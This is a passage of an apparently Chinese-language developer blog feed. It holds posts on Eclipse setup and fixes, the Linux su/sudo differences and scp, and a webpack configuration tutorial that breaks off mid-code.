<p>Help -&gt; install new software &#x641C;&#x7D22;&#x7B26;&#x5408;&#x5F53;&#x524D; eclipse &#x7248;&#x672C;&#x53F7;&#x7684; item work with&#x3002;&#x627E;&#x5230; Web, XML, Java EE and OSGI Enterprise Development&#xFF08;&#x53EF;&#x4EE5;&#x5177;&#x4F53;&#x5230;  Eclipse IDE for Java EE Developers&#xFF09;&#x3002;</p>
<pre><code class="language-shell">2021-06 - http://download.eclipse.org/releases/2021-06/202106161001
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E5%B7%A5%E4%BD%9C%E5%8C%BA%E9%85%8D%E7%BD%AE">&#x5DE5;&#x4F5C;&#x533A;&#x914D;&#x7F6E;</h2>
<ul>
<li>Access Commands and other items</li>
</ul>
<p>navigator&#x3001;workspace&#x3001;outline&#x3001;console</p>
<ul>
<li>New</li>
</ul>
<p>window -&gt; perspective -&gt; customize perspective -&gt; menu visibility -&gt; file &#x914D;&#x7F6E; new &#x76F8;&#x5173;&#x3002;</p>
<p>Java Project&#x3001;Package&#x3001;Class&#x3001;Interface&#x3001;Enum&#x3001;Annotation&#x3001;JUnit Test Case&#x3001;Folder&#x3001;File&#x3001;HTML File&#x3001;Static Web Project&#x3001;JSP File&#x3001;Dynamic Web Project&#x3001;Servlet&#x3001;Filter&#x3001;Listener&#x3001;XML File</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="eclipse-jee-vs-eclipse-java">eclipse-jee vs eclipse-java</h2>
<p>&#x5728; Homebrew &#x4E0A;&#x5B58;&#x5728;&#x4E09;&#x79CD;&#x7C7B;&#x578B;&#x7684; eclipse &#x7248;&#x672C;&#xFF0C;cpp&#x3001;jee&#x3001;java&#x3002;&#x5176;&#x4E2D; Eclipse for Java &#x662F;&#x5E26;&#x6709; GUI &#x548C; Swings &#x5E93;&#x7684;&#x57FA;&#x672C; IDE&#x3002;&#x4F46;&#x7F3A;&#x5C11;&#x7528;&#x4E8E;&#x5904;&#x7406;&#x6570;&#x636E;&#x5E93;&#x548C; Web &#x5F00;&#x53D1;&#x7684;&#x90E8;&#x5206;&#x63D2;&#x4EF6;&#x3002;&#x9002;&#x7528;&#x4E8E; Java EE &#x7684; Eclipse IDE&#xFF08;EE &#x4EE3;&#x8868;&#x4F01;&#x4E1A;&#x7248;&#xFF09;&#x9884;&#x88C5;&#x4E86;&#x6240;&#x6709;&#x8FD9;&#x4E9B;&#x63D2;&#x4EF6;&#xFF0C;&#x4FBF;&#x4E8E;&#x5236;&#x4F5C;&#x5B8C;&#x6574;&#x7684;&#x8F6F;&#x4EF6;&#xFF0C;&#x4E5F;&#x662F;&#x6700;&#x7406;&#x60F3;&#x7684;&#x9009;&#x62E9;&#x3002;&#x7406;&#x8BBA;&#x4E0A;&#x53EF;&#x4EE5;&#x5C06;&#x6240;&#x6709;&#x7EC4;&#x4EF6;&#x4ECE; Eclipse Java EE &#x5B89;&#x88C5;&#x5230; Eclipse for Java&#x3002;&#x4F46;&#x662F;&#x5FC5;&#x987B;&#x4E0B;&#x8F7D;&#x5E76;&#x89E3;&#x538B;&#x7F29; Eclipse for Java Developers &#x5E76;&#x5B89;&#x88C5;&#x540D;&#x4E3A; web tools platform &#x7684;&#x63D2;&#x4EF6;&#x3002;&#x800C; cpp &#x7248;&#x672C;&#x5219;&#x662F;&#x5B89;&#x88C5;&#x4E86; C/C++ &#x5728;&#x6B64;&#x7248;&#x672C;&#x7684; eclipse &#x4E0A;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="bugs-fixed">Bugs fixed</h2>
<p>&quot;You do not have permission to open the application Eclipse JEE.app.Contact your computer or network administrator for assistance.&quot;</p>
<pre><code class="language-shell"># Problem Report for eclipse
Crashed Thread:        Unknown

Exception Type:        EXC_CRASH (Code Signature Invalid)
Exception Codes:       0x0000000000000000, 0x0000000000000000
Exception Note:        EXC_CORPSE_NOTIFY
</code></pre>
<p>&#x7A0B;&#x5E8F;&#x8FD0;&#x884C; crashed &#x662F;&#x7531;&#x4E8E; Code Signature Invalid&#xFF08;&#x7B7E;&#x540D;&#x95EE;&#x9898;&#xFF09;&#x3002;&#x867D;&#x7136; Mac &#x542F;&#x7528;&#x7684;&#x5B89;&#x5168;&#x673A;&#x5236;&#x9ED8;&#x8BA4;&#x53EA;&#x4FE1;&#x4EFB; Mac App Store &#x4EE5;&#x53CA;&#x62E5;&#x6709;&#x5F00;&#x53D1;&#x8005; ID &#x7B7E;&#x540D;&#x7684;&#x8F6F;&#x4EF6;&#xFF0C;&#x540C;&#x65F6;&#x963B;&#x6B62;&#x6CA1;&#x6709;&#x5F00;&#x53D1;&#x8005;&#x7B7E;&#x540D;&#x7684;&#x8F6F;&#x4EF6;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x4E0D;&#x662F;&#x6211;&#x7B2C;&#x4E00;&#x6B21;&#x6253;&#x5F00;&#x6B64;&#x8F6F;&#x4EF6;&#xFF0C;&#x800C;&#x662F;&#x8FDB;&#x884C;&#x7CFB;&#x7EDF;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;&#x540E;&#x7684;&#x526F;&#x4F5C;&#x7528;&#x3002;&#x5728;&#x5C1D;&#x8BD5;&#x91CD;&#x65B0;&#x7ED9;&#x8F6F;&#x4EF6;&#x8FDB;&#x884C;&#x7B7E;&#x540D;&#x540E;&#x95EE;&#x9898;&#x89E3;&#x51B3;&#x3002;<a href="https://www.quwenqing.com/archives/1539.html">&#x7C7B;&#x4F3C;&#x95EE;&#x9898;</a>&#x3002;</p>
<pre><code class="language-shell">$ sudo codesign --force --deep --sign - /Applications/Eclipse\ JEE.app
Password:
/Applications/Eclipse JEE.app: replacing existing signature
</code></pre>
<p>&quot;The word &apos;localhost&apos; is not correctly spelled.&quot; &#x63D0;&#x793A;&#x5904;&#x7406;&#x3002;</p>
<p>Preference &#x8F93;&#x5165; spell&#xFF0C;&#x5C06;&#x590D;&#x9009;&#x6846; &quot;Enable spell checking&quot; &#x53BB;&#x6389;&#x5373;&#x53EF;&#x3002;</p>
<p>junit &#x62A5;&#x9519; =&gt; java.lang.Exception: No tests found matching [{ExactMatcher:fDisplayName=testQuery1]</p>
<p>&#x8003;&#x8651;&#x4E09;&#x4E2A;&#x65B9;&#x9762;&#xFF0C;&#x662F;&#x4E0D;&#x662F;&#x6CA1;&#x5199; @Test&#xFF1B;&#x662F;&#x5426;&#x662F; public&#x3001;&#x53C2;&#x6570;&#x3001;&#x8FD4;&#x56DE;&#x503C;&#x3001;&#x4FEE;&#x9970;&#x7B26;&#x7684;&#x9519;&#x8BEF;&#xFF1B;&#x662F;&#x4E0D;&#x662F; spring &#x5305;&#x4E0E; junit &#x7684;&#x5305;&#x7684;&#x517C;&#x5BB9;&#x95EE;&#x9898;&#xFF1B;&#x662F;&#x5426;&#x65E5;&#x5FD7;&#x5DF2;&#x6DFB;&#x52A0;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE; &#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[Linux]]></title><description><![CDATA[GOOGLE CLOUD 操作后的反思]]></description><link>yourdomain.com/susudo/</link><guid isPermaLink="false">61041f419d12cb59362406b9</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Tue, 30 Mar 2021 14:03:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2021/09/linuxbg.jpg" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="su%E3%80%81su-%E3%80%81sudo">su&#x3001;su-&#x3001;sudo</h2>
<ul>
<li>su&#x3001;sudo</li>
</ul>
<img src="yourdomain.com/content/images/2021/09/linuxbg.jpg" alt="Linux"><p><code>su</code> &#x548C; <code>su -</code> &#x90FD;&#x662F;&#x9700;&#x8981;&#x8F93;&#x5165;&#x76EE;&#x6807;&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;&#x4EE5;&#x5207;&#x6362;&#x5230;&#x53E6;&#x5916;&#x7684; shell &#x5B9E;&#x4F8B;&#x3002;&#x90A3;&#x4E48;&#x5F88;&#x660E;&#x663E;&#x7684;&#xFF0C;&#x7531;&#x4E8E;&#x767B;&#x5F55; root &#x7528;&#x6237;&#x5C31;&#x9700;&#x8981; root &#x8EAB;&#x4EFD;&#x5BC6;&#x7801;&#xFF0C;&#x5728;&#x591A;&#x7528;&#x6237;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#x901A;&#x8FC7; <code>su</code>&#x3001;<code>su -</code> &#x8FDB;&#x884C; root &#x8BBF;&#x95EE;&#x6743;&#x9650;&#x610F;&#x5473;&#x7740; root &#x7528;&#x6237;&#x5BC6;&#x7801;&#x9690;&#x79C1;&#x6027;&#x6B20;&#x4F73;&#x3002;</p>
<p><code>sudo</code> (superuser-do&#x52A9;&#x8BB0;&#x7B26;) &#x7684;&#x4F7F;&#x7528;&#x539F;&#x7406;&#x4E0E;&#x4E0A;&#x8FF0;&#x662F;&#x5357;&#x8F95;&#x5317;&#x8F99;&#x7684;&#x3002;&#x5373;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;(/etc/sudoers) &#x5217;&#x51FA;&#x6BCF;&#x4E2A;&#x7528;&#x6237;&#x7684;&#x7279;&#x5B9A;&#x64CD;&#x4F5C;&#x6743;&#x9650;&#x3002;&#x5F53;&#x8C03;&#x7528;&#x65F6;&#xFF0C;&#x8981;&#x6C42;&#x9A8C;&#x8BC1;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x7528;&#x6237;&#x8EAB;&#x4EFD;&#x5BC6;&#x7801;&#x6765;&#x5141;&#x8BB8;&#x63D0;&#x5347;&#x6743;&#x9650;&#x8FD0;&#x884C;&#x5355;&#x4E2A;&#x547D;&#x4EE4;&#x4E14;&#x4E0D;&#x4F1A;&#x542F;&#x52A8;&#x4E00;&#x4E2A;&#x65B0;&#x7684; shell&#x3002;</p>
<p>&#x901A;&#x5E38;&#x5728; Linux &#x7CFB;&#x7EDF;&#x4E2D;&#x975E; root &#x7528;&#x6237;&#x8FD0;&#x884C;sudo&#x547D;&#x4EE4;&#xFF0C;&#x4F1A;&#x63D0;&#x793A;&#x4EE5;&#x4E0B;&#x4FE1;&#x606F;</p>
<pre><code class="language-shell"># xxx &#x5F53;&#x524D;&#x7528;&#x6237;&#x65E0;&#x6CD5;&#x6267;&#x884C; sudo &#x547D;&#x4EE4;
$ xxx is not in the sudoers file.  This incident will be reported. 
</code></pre>
<p>&#x90A3;&#x4E48;&#x5C31;&#x9700;&#x8981; <code>su -</code> &#x8FDB;&#x5165;&#x8D85;&#x7EA7;&#x7528;&#x6237;&#x540E;&#x7ED9;&#x914D;&#x7F6E;&#x6587;&#x4EF6; <code>/etc/sudoers</code> &#x6DFB;&#x52A0;&#x6DFB;&#x52A0; xxx &#x6743;&#x9650;&#x3002;&#x8FD9;&#x91CC;&#x6CE8;&#x610F;&#x7F16;&#x8F91;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x53EF;&#x80FD;&#x64CD;&#x4F5C;&#x4F1A;&#x56E0;&#x6743;&#x9650;&#x95EE;&#x9898;&#x88AB;&#x963B;&#x6B62;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; <code>chmod u+w /etc/sudoers</code> &#x52A0;&#x5199;&#x6743;&#x5229;&#x3002;&#x5728; <code>nvim /etc/sudoers</code> &#x5B8C;&#x6210;&#x6DFB;&#x52A0; <code>xxx ALL=(ALL)ALL</code> &#x540E;&#x64A4;&#x9500;&#x6587;&#x4EF6;&#x7684;&#x5199;&#x6743;&#x5229; <code>chmod u-w /etc/sudoers</code>&#x3002;</p>
<ul>
<li>su &#x4E0E; su -</li>
</ul>
<p>&#x8FD9;&#x91CC;&#x6709;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x4E0A;&#x6587;&#x4E2D;&#x4F7F;&#x7528; <code>su -i</code> &#x662F;&#x4EC0;&#x4E48;&#x610F;&#x601D;&#xFF0C;&#x548C;&#x76F4;&#x63A5; <code>su</code> &#x6709;&#x4EC0;&#x4E48;&#x533A;&#x522B;&#xFF1F;</p>
<p>&#x9996;&#x5148;&#x80FD;&#x786E;&#x5B9A;&#x7684;&#x662F; <code>su</code> &#x548C; <code>su -</code> &#x90FD;&#x4F1A;&#x5207;&#x6362;&#x5230; root &#x7528;&#x6237;&#x3002;&#x4F46;&#x662F;&#x5C31;&#x73AF;&#x5883;&#x6765;&#x8BF4;&#xFF0C;<code>su</code> &#x5207;&#x6362;&#x5230; root &#x7684;&#x540C;&#x65F6;&#xFF0C;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x4FDD;&#x6301;&#x666E;&#x901A;&#x7528;&#x6237;&#x7684;&#x4E0D;&#x53D8;&#x3002;&#x800C; <code>su -</code> &#x53EF;&#x4EE5;&#x770B;&#x6210;&#x7528;&#x6237;&#x548C;&#x73AF;&#x5883;&#x4E00;&#x8D77;&#x5207;&#x4E3A; root &#x8EAB;&#x4EFD;&#x3002;</p>
<pre><code class="language-shell">newghostzs@VM-4-10-ubuntu:~$ pwd
/home/newghostzs
newghostzs@VM-4-10-ubuntu:~$ su
Password:....
root@VM-4-10-ubuntu:/home/newghostzs# pwd
/home/newghostzs
# ----
newghostzs@VM-4-10-ubuntu:~$ su -
Password: 
root@VM-4-10-ubuntu:~# pwd
/root
</code></pre>
<ul>
<li>sudo -s &#x4E0E; sudo -i</li>
</ul>
<p>&#x548C; <code>sudo</code> &#x5141;&#x8BB8;&#x4EE5;&#x81EA;&#x5DF1;&#x7684;&#x7528;&#x6236;&#x8D26;&#x6237;&#x4EE5; root &#x6743;&#x9650;&#x8FD0;&#x884C;&#x547D;&#x4EE4;&#x53C8;&#x4E0D;&#x540C;&#x3002;<code>sudo -s</code> &#x4EE5; root &#x6743;&#x9650;&#x8FD0;&#x884C;&#x4E00;&#x4E2A; shell &#x3002;&#x800C; <code>sudo -i</code> &#x4E0D;&#x4F46;&#x4EE5; root &#x6743;&#x9650;&#x8FD0;&#x884C;&#x4E00;&#x4E2A; shell&#xFF0C;&#x8FD8;&#x4F1A;&#x83B7;&#x53D6; root &#x7528;&#x6237;&#x7684;&#x73AF;&#x5883;&#x3002;&#x66F4;&#x76F4;&#x89C2;&#x6765;&#x8BF4;&#x524D;&#x8005;&#x5728;&#x7528;&#x6237;&#x73AF;&#x5883;&#x4E2D;&#x4FDD;&#x7559; <code>~/.bashrc</code> &#x540E;&#x8005;&#x5728;&#x6839;&#x73AF;&#x5883;&#x5FFD;&#x7565; <code>~/.bashrc</code>&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="scp">scp</h2>
<p>scp &#x5373; secure copy&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x5728; Linux(MAC) &#x73AF;&#x5883;&#x4E0B;&#x8FDB;&#x884C;&#x8FDC;&#x7A0B;&#x52A0;&#x5BC6;&#x4F20;&#x8F93;&#x6587;&#x4EF6;&#xFF08;&#x76EE;&#x5F55;&#xFF09;&#x7684;&#x547D;&#x4EE4;&#x3002;&#x7C7B;&#x4F3C;&#x7684;&#x6709;&#x4EC5;&#x5728;&#x672C;&#x673A;&#x8FDB;&#x884C;&#x62F7;&#x8D1D;&#x7684; cp&#x3002;</p>
<pre><code class="language-shell"># &#x5927;&#x5199; P &#x4E3A;&#x7AEF;&#x53E3;&#x53C2;&#x6570;&#xFF0C;2368 &#x8868;&#x793A;&#x66F4;&#x6539;&#x540E;&#x7684; SSH &#x7AEF;&#x53E3;&#xFF0C;&#x5982;&#x679C;&#x672A;&#x66F4;&#x6539; SSH &#x7AEF;&#x53E3;&#x5219;&#x4E0D;&#x5FC5;&#x6DFB;&#x52A0;&#x3002;
# -r &#x53C2;&#x6570;&#x8868;&#x793A;&#x9012;&#x5F52;&#x590D;&#x5236;&#xFF08;&#x5373;&#x590D;&#x5236;&#x8BE5;&#x76EE;&#x5F55;&#x4E0B;&#x9762;&#x7684;&#x6587;&#x4EF6;&#x548C;&#x76EE;&#x5F55;&#xFF09;&#xFF1B;
scp -P 2368 -r /Users/zszs/.../images root@x.xx.xx.xxx:/var/www/.../content
</code></pre>
<p>&#x82E5;&#x4F20;&#x8F93;&#x76EE;&#x5F55;&#x672A;&#x4F7F;&#x7528; -r &#x4FEE;&#x9970;&#x5219;&#x4F1A;&#x51FA;&#x73B0; &apos;Error using SCP: &quot;not a regular file&quot;&apos; &#x7684;&#x62A5;&#x9519;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE; &#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[Webpack]]></title><description><![CDATA[webpack配置与异常]]></description><link>yourdomain.com/webpack/</link><guid isPermaLink="false">60e1e88bdcff0833706c15f9</guid><category><![CDATA[BUG handled]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Mon, 08 Mar 2021 11:55:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2022/07/mickey.jpg" medium="image"/><content:encoded><![CDATA[<img src="yourdomain.com/content/images/2022/07/mickey.jpg" alt="Webpack"><p>webpack &#x662F;&#x4E00;&#x6B3E;&#x524D;&#x7AEF;&#x8D44;&#x6E90;&#x6784;&#x5EFA;&#x5DE5;&#x5177;&#xFF0C;&#x5373;&#x9759;&#x6001;&#x6A21;&#x5757;&#x6253;&#x5305;&#x5668; module bundler&#xFF0C;&#x5C06;&#x524D;&#x7AEF;&#x7684;&#x6240;&#x6709;&#x8D44;&#x6E90;&#x6587;&#x4EF6; js/json/css/img/less... &#x90FD;&#x4F5C;&#x4E3A;&#x6A21;&#x5757;&#x5904;&#x7406;&#x3002;&#x6839;&#x636E;&#x6A21;&#x5757;&#x7684;&#x4F9D;&#x8D56;&#x5173;&#x7CFB;&#x8FDB;&#x884C;&#x9759;&#x6001;&#x5206;&#x6790;&#xFF0C;&#x6253;&#x5305;&#x751F;&#x6210;&#x5BF9;&#x5E94;&#x7684;&#x9759;&#x6001;&#x8D44;&#x6E90; bundle&#x3002;</p><!--kg-card-begin: markdown--><h2 id>&#x4E94;&#x4E2A;&#x6838;&#x5FC3;</h2>
<ul>
<li>Entry &#x5165;&#x53E3;&#x6307;&#x793A; webpack &#x4EE5;&#x54EA;&#x4E2A;&#x6587;&#x4EF6;&#x4E3A;&#x5165;&#x53E3;&#x8D77;&#x70B9;&#x5F00;&#x59CB;&#x6253;&#x5305;&#xFF0C;&#x5206;&#x6790;&#x6784;&#x5EFA;&#x5185;&#x90E8;&#x4F9D;&#x8D56;&#x56FE;&#x3002;</li>
<li>Output &#x8F93;&#x51FA;&#x6307;&#x793A; webpack &#x6253;&#x5305;&#x540E;&#x7684;&#x8D44;&#x6E90; bundles &#x8F93;&#x51FA;&#x5230;&#x54EA;&#x91CC;&#x53BB;&#xFF0C;&#x4EE5;&#x53CA;&#x5982;&#x4F55;&#x547D;&#x540D;&#x3002;</li>
<li>Loader &#x8BA9; webpack &#x80FD;&#x591F;&#x53BB;&#x5904;&#x7406;&#x90A3;&#x4E9B;&#x975E; JS &#x6587;&#x4EF6; (webpack &#x81EA;&#x8EAB;&#x53EA;&#x7406;&#x89E3; JS)&#x3002;</li>
<li>Plugins &#x63D2;&#x4EF6;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x6267;&#x884C;&#x8303;&#x56F4;&#x66F4;&#x5E7F;&#x7684;&#x4EFB;&#x52A1;&#x3002;&#x63D2;&#x4EF6;&#x7684;&#x8303;&#x56F4;&#x5305;&#x62EC;&#x4ECE;&#x6253;&#x5305;&#x4F18;&#x5316;&#x548C;&#x538B;&#x7F29;&#x5230;&#x91CD;&#x65B0;&#x5B9A;&#x4E49;&#x73AF;&#x5883;&#x4E2D;&#x7684;&#x53D8;&#x91CF;&#x7B49;&#x3002;</li>
<li>Mode &#x6A21;&#x5F0F;&#x6307;&#x793A; webpack &#x4F7F;&#x7528;&#x76F8;&#x5E94;&#x6A21;&#x5F0F;&#x7684;&#x914D;&#x7F6E;&#x3002;
<ul>
<li>development &#x4F1A;&#x5C06; DefinePlugin &#x4E2D; process.env.NODE_ENV &#x7684;&#x503C;&#x8BBE;&#x7F6E;&#x4E3A; development&#x3002;&#x542F;&#x7528; NamedChunksPlugin &#x548C; NamedModulesPlugin&#x3002;</li>
<li>production &#x4F1A;&#x5C06; DefinePlugin &#x4E2D; process.env.NODE_ENV &#x7684;&#x503C;&#x8BBE;&#x7F6E;&#x4E3A; production&#x3002;&#x542F;&#x7528; FlagDependencyUsagePlugin, FlagIncludedChunksPlugin, ModuleConcatenationPlugin, NoEmitOnErrorsPlugin, OccurrenceOrderPlugin, SideEffectsFlagPlugin &#x548C; TerserPlugin&#x3002;</li>
</ul>
</li>
</ul>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id>&#x5FEB;&#x901F;&#x4E0A;&#x624B;</h2>
<ul>
<li>&#x521D;&#x59CB;&#x5316;&#x914D;&#x7F6E;</li>
</ul>
<pre><code class="language-shell"># &#x521D;&#x59CB;&#x5316; package.json
npm init
# &#x4E0B;&#x8F7D;&#x5E76;&#x5B89;&#x88C5; webpack
npm install webpack webpack-cli -g
npm install webpack webpack-cli -D
</code></pre>
<ul>
<li>&#x7F16;&#x8BD1;&#x6253;&#x5305;&#x5E94;&#x7528;</li>
</ul>
<pre><code class="language-shell"># &#x5F00;&#x53D1;&#x73AF;&#x5883;&#x6307;&#x4EE4; - webpack &#x80FD;&#x591F;&#x7F16;&#x8BD1;&#x6253;&#x5305; js &#x548C; json &#x6587;&#x4EF6;,&#x5E76;&#x4E14;&#x80FD;&#x5C06; es6 &#x7684;&#x6A21;&#x5757;&#x5316;&#x8BED;&#x6CD5;&#x8F6C;&#x6362;&#x6210; &#x6D4F;&#x89C8;&#x5668;&#x80FD;&#x8BC6;&#x522B;&#x7684;&#x8BED;&#x6CD5;
webpack src/js/index.js -o build/js/built.js --mode=development
# &#x751F;&#x4EA7;&#x73AF;&#x5883;&#x6307;&#x4EE4; - &#x5728;&#x5F00;&#x53D1;&#x914D;&#x7F6E;&#x529F;&#x80FD;&#x4E0A;&#x591A;&#x51FA;&#x538B;&#x7F29;&#x4EE3;&#x7801;&#x7684;&#x529F;&#x80FD;
webpack src/js/index.js -o build/js/built.js --mode=production
</code></pre>
<ul>
<li>&#x5FEB;&#x901F;&#x4E0A;&#x624B;&#x5C0F;&#x7ED3;</li>
</ul>
<p>webpack &#x80FD;&#x591F;&#x7F16;&#x8BD1;&#x6253;&#x5305; js &#x548C; json &#x6587;&#x4EF6;&#xFF1B;&#x80FD;&#x5C06; es6 &#x7684;&#x6A21;&#x5757;&#x5316;&#x8BED;&#x6CD5;&#x8F6C;&#x6362;&#x6210;&#x6D4F;&#x89C8;&#x5668;&#x80FD;&#x8BC6;&#x522B;&#x7684;&#x8BED;&#x6CD5;&#xFF1B;&#x80FD;&#x538B;&#x7F29;&#x4EE3;&#x7801;&#x3002;&#x5C40;&#x9650;&#x5728;&#x4E8E;&#x4E0D;&#x80FD;&#x7F16;&#x8BD1;&#x6253;&#x5305; css&#x3001;img &#x7B49;&#x6587;&#x4EF6;&#x3002;&#x4E0D;&#x80FD;&#x5C06; js &#x7684; es6 &#x57FA;&#x672C;&#x8BED;&#x6CD5;&#x8F6C;&#x5316;&#x4E3A; es5 &#x4EE5;&#x4E0B;&#x8BED;&#x6CD5;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id>&#x5F00;&#x53D1;&#x73AF;&#x5883;&#x914D;&#x7F6E;</h2>
<h3 id>&#x57FA;&#x7840;&#x6253;&#x5305;</h3>
<pre><code class="language-javascript">// webpack.config.js
const { resolve } = require(&apos;path&apos;); // node &#x5185;&#x7F6E;&#x6838;&#x5FC3;&#x6A21;&#x5757;&#x5904;&#x7406;&#x8DEF;&#x5F84;&#x95EE;&#x9898;
module.exports = { 
  entry: &apos;./src/js/index.js&apos;, // &#x5165;&#x53E3;&#x6587;&#x4EF6;
  output: { // &#x8F93;&#x51FA;&#x914D;&#x7F6E; 
  	filename: &apos;./built.js&apos;, // &#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x540D; 
  	path: resolve(__dirname, &apos;build/js&apos;) // &#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x914D;&#x7F6E; 
  },
  mode: &apos;development&apos; //&#x5F00;&#x53D1;&#x73AF;&#x5883; 
};
</code></pre>
<h3 id>&#x6253;&#x5305;&#x6837;&#x5F0F;&#x8D44;&#x6E90;</h3>
<p>&#x4E0B;&#x8F7D;&#x5B89;&#x88C5; loader &#x5305;</p>
<pre><code class="language-shell">npm i css-loader style-loader less-loader less -D
</code></pre>
<pre><code class="language-javascript">...
// loader &#x7684;&#x914D;&#x7F6E; &#x2014;&#x2014; module.rules &#x5141;&#x8BB8;&#x5728; webpack &#x914D;&#x7F6E;&#x4E2D;&#x6307;&#x5B9A;&#x591A;&#x4E2A; loader
module: { // &#x4E0D;&#x540C;&#x6587;&#x4EF6;&#x5FC5;&#x987B;&#x914D;&#x7F6E;&#x4E0D;&#x540C; loader &#x5904;&#x7406;
  rules: [
    {
      test: /\.css$/, // test &#x6B63;&#x5219;&#x5339;&#x914D;&#x6587;&#x4EF6;
      use: [ // use &#x6570;&#x7EC4;&#x4E2D;&#x4F7F;&#x7528; loader &#x7684;&#x6267;&#x884C;&#x987A;&#x5E8F;&#x4E3A;&#x4ECE;&#x53F3;&#x5230;&#x5DE6;\&#x4ECE;&#x4E0B;&#x5230;&#x4E0A;&#x4F9D;&#x6B21;&#x6267;&#x884C;
        // &#x521B;&#x5EFA; style &#x6807;&#x7B7E;&#x5E76;&#x5C06; js &#x91CC;&#x7684;&#x6837;&#x5F0F;&#x8D44;&#x6E90;&#x6DFB;&#x52A0;&#x5230; head &#x4E2D;&#x751F;&#x6548; 
        &apos;style-loader&apos;,
        // &#x5C06; css &#x6587;&#x4EF6;&#x53D8;&#x6210;&#x6837;&#x5F0F;&#x5B57;&#x7B26;&#x4E32;&#x7684; commonjs &#x6A21;&#x5757;&#x52A0;&#x8F7D;&#x81F3; js
        &apos;css-loader&apos;
        ]
      },
      { 
        test: /\.less$/, 
        use: [ 
          // &#x9700;&#x8981;&#x4E0B;&#x8F7D; less-loader &#x548C; less &#x5C06; less &#x6587;&#x4EF6;&#x7F16;&#x8BD1;&#x6210; css
          &apos;style-loader&apos;, &apos;css-loader&apos;, &apos;less-loader&apos;
        ] 
      } 
    ] 
  },
...
</code></pre>
<p>&#x6709;&#x4E86;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x53EA;&#x9700;&#x5728;&#x7EC8;&#x7AEF;&#x4E2D;&#x8FD0;&#x884C; webpack &#x547D;&#x4EE4;&#x5C31;&#x53EF;&#x8FDB;&#x884C;&#x6253;&#x5305;&#xFF0C;&#x8FD9;&#x6761;&#x547D;&#x4EE4;&#x4F1A;&#x81EA;&#x52A8;&#x5F15;&#x7528; webpack.config.js &#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x914D;&#x7F6E;&#x9009;&#x9879;&#x3002;</p>
<h3 id="html">&#x6253;&#x5305; HTML &#x8D44;&#x6E90;</h3>
<pre><code>&#x6587;&#x4EF6;&#x5939;---src---index.js
	|	 &#x2514;&#x2500;&#x2500;---index.html
	&#x2514;&#x2500;&#x2500;----------webpack.config.js
</code></pre>
<pre><code class="language-shell"># &#x4E0B;&#x8F7D;&#x5B89;&#x88C5; plugin &#x5305;
npm install --save-dev html-webpack-plugin
</code></pre>
<pre><code class="language-javascript">...
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
module.exports = { 
...
plugins: [  // plugins &#x7684;&#x914D;&#x7F6E; 
    // html-webpack-plugin &#x9ED8;&#x8BA4;&#x4F1A;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7A7A;&#x7684; HTML &#x5E76;&#x81EA;&#x52A8;&#x5F15;&#x5165;&#x6253;&#x5305;&#x8F93;&#x51FA;&#x7684;&#x6240;&#x6709;&#x8D44;&#x6E90; JS/CSS &#x9002;&#x5408;&#x9700;&#x8981;&#x6709;&#x7ED3;&#x6784;&#x7684; HTML &#x6587;&#x4EF6; 
    new HtmlWebpackPlugin({ 
